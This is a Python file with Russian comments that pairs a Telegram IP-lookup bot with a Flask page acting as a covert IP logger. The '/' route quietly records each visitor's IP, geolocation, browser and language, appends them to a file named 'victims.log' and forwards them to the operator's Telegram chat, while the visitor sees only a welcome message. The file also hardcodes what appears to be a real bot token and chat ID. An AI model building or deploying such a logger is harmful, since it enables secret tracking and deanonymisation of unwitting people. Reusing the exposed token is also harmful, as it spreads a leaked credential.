from flask import Flask, request
import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

app = Flask(__name__)

# Токен бота и твой Telegram ID
BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE"
CHAT_ID = "7477642275"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Токены для дополнительных API
IPINFO_TOKEN = "your_ipinfo_token"
IPSTACK_TOKEN = "your_ipstack_token"

# Функция получения информации об IP
def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting,timezone,query")
        data = response.json()
        if data.get("status") == "fail":
            raise ValueError("Данные с ip-api недоступны")
        return format_ip_info(data)
    except Exception as e:
        print(f"Ошибка с ip-api.com: {e}")

    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}")
        data = response.json()
        if "error" in data:
            raise ValueError("Данные с ipinfo.io недоступны")
        return format_ip_info(data)
    except Exception as e:
        print(f"Ошибка с ipinfo.io: {e}")

    try:
        response = requests.get(f"http://api.ipstack.com/{ip}?access_key={IPSTACK_TOKEN}&fields=country,region_name,city,zip,latitude,longitude,isp,organization,connection_type,timezone")
        data = response.json()
        if "error" in data:
            raise ValueError("Данные с ipstack.com недоступны")
        return format_ip_info(data)
    except Exception as e:
        print(f"Ошибка с ipstack.com: {e}")

    return f"IP: {ip} (информация недоступна)"

# Функция форматирования данных
def format_ip_info(data):
    return (f"🔹 IP: {data.get('ip', 'Неизвестно')}\n"
            f"🌍 Страна: {data.get('country', 'Неизвестно')}\n"
            f"🏙 Регион: {data.get('region_name', 'Неизвестно')}\n"
            f"🏠 Город: {data.get('city', 'Неизвестно')}\n"
            f"🕒 Временная зона: {data.get('timezone', 'Неизвестно')}\n"
            f"📍 Координаты: {data.get('latitude', 'Неизвестно')}, {data.get('longitude', 'Неизвестно')}\n"
            f"📡 Провайдер: {data.get('isp', 'Неизвестно')}\n"
            f"🏢 Организация: {data.get('organization', 'Неизвестно')}\n"
            f"🔗 AS: {data.get('asn', 'Неизвестно')}\n"
            f"📱 Мобильный: {'Да' if data.get('mobile') else 'Нет'}\n"
            f"🛡 Прокси: {'Да' if data.get('proxy') else 'Нет'}\n"
            f"🏢 Хостинг: {'Да' if data.get('hosting') else 'Нет'}")

# Команда /start
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Привет! Я могу предоставить информацию по IP. Используй команду /ip <IP>.")

# Команда /ip <ip>
def ip_info(update: Update, context: CallbackContext):
    if context.args:
        ip = context.args[0]  # Получаем IP из команды
        ip_info = get_ip_info(ip)
        update.message.reply_text(ip_info)
    else:
        update.message.reply_text("Пожалуйста, укажи IP после команды, например: /ip 8.8.8.8")

# Функция для отправки сообщений в Telegram
def send_to_telegram(message):
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(TELEGRAM_API, data=payload)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

# Инициализация бота
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Добавляем обработчики команд
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("ip", ip_info))

    # Запускаем бота
    updater.start_polling()
    updater.idle()

# Flask сервер для обработки веб-запросов
@app.route('/')
def log_ip():
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)  # Учитываем прокси
    user_agent = request.headers.get("User-Agent")
    referer = request.headers.get("Referer", "Неизвестно")
    accept_language = request.headers.get("Accept-Language", "Неизвестно")
    dnt = request.headers.get("DNT", "Неизвестно")

    ip_info = get_ip_info(user_ip)
    log_message = (f"{ip_info}\n"
                   f"🖥 User-Agent: {user_agent}\n"
                   f"🔗 Referer: {referer}\n"
                   f"🌐 Язык: {accept_language}\n"
                   f"🚫 DNT (Не отслеживать): {'Включено' if dnt == '1' else 'Выключено'}")

    # Запись в файл
    with open('victims.log', 'a') as f:
        f.write(f"{log_message}\n\n")

    # Отправка в Telegram
    send_to_telegram(log_message)

    return "Добро пожаловать на сайт!"

if __name__ == '__main__':
    # Запуск Flask сервера в отдельном потоке
    from threading import Thread
    flask_thread = Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000})
    flask_thread.start()

    # Запуск Telegram-бота
    main()
